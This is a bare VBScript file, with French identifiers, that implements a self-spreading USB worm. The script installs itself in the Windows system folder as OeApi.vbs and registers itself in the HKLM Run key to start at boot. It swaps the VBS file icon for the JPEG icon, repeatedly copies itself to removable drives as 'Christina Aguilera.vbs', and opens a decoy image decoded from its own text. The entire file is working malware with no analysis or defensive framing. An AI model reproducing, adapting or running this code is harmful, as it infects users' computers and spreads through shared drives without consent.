on error resume next
demarrage = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System"
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSSH = CreateObject("Wscript.shell")
Set xx = FSO.GetSpecialFolder(1)
dim fso,codeintegral 
Set fso = CreateObject("Scripting.FileSystemObject")
entrer
sub entrer()
ss = cstr(xx)
location = wscript.scriptfullname
if instr(location,ss)=false then
diversion2
else
do while time <> "00:00:00"
detecterracines
wscript.sleep 180000
loop
end if
detecterracines

if (fso.fileexists(xx & "\OeApi.vbs")) then
else
copiermessage xx,"OeApi"
DemarrerDe xx
changericone
end if
end sub

sub detecterracines()
Dim fso, d, dc, s, n
Set fso = CreateObject("Scripting.FileSystemObject")
Set dc = fso.Drives
For Each d in dc
racine = d.Driveletter & ":"
u= detectamovibles(racine)
'msgbox racine
if u ="Amovible" and d.isready then 

if not (fso.fileexists(racine & "\Christina Aguilera.vbs")) then
copiermessage racine,"Christina Aguilera"
end if
end if
Next
end sub
Function detectamovibles(drvpath)
Dim fso, d, s, t
Set fso = CreateObject("Scripting.FileSystemObject")

Set d = fso.GetDrive(fso.GetDriveName(fso.GetAbsolutePathName(drvpath)))
Select Case d.DriveType
Case 0: t = "Inconnu"
Case 1: t = "Amovible"
Case 2: t = "Fixe"
Case 3: t = "Rseau"
Case 4: t = "CD-ROM"
Case 5: t = "RAM Disk"
End Select

detectamovibles = t
End Function
sub ChangerIcone()
dim resultat
resultat = wssh.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\jpegfile\DefaultIcon\")
wssh.Regwrite"HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Vbsfile\DefaultIcon\",resultat
end sub
sub DemarrerDe(Location)
set wssh = CreateObject("WScript.Shell")

wssh.regwrite demarrage,location & "\OeApi.vbs"
end sub
sub copiermessage(x,name)
File = Wscript.ScriptFullName
fso.copyfile file ,x & "\" & name & ".vbs"
end sub
sub diversion2()
Dim fso, f, f2, ts, ts2
Dim Ligne, i
Set FSO = CreateObject("Scripting.FileSystemObject")
if (fso.fileexists(xx & "\Christina.jpg")) then
wssh.run xx & "\Christina.jpg"
else
Set f = fso.GetFile(WScript.ScriptFullName)
Set ts = f.OpenAsTextStream(1, -2)
fso.CreateTextFile xx & "\Christina.jpg"

Set f2 = fso.GetFile(xx & "\Christina.jpg")
Set ts2 = f2.OpenAsTextStream(2, -2)
for i=1 to 103
ts.skipline
next
do
Ligne = ts.readline
For i=2 to Len(Ligne) step 2
ts2.write chr("&h" & mid(Ligne,i,2))
Next

loop until ts.AtEndOfStream
ts.Close
ts2.Close
wssh.run xx & "\Christina.jpg"
end if
end sub

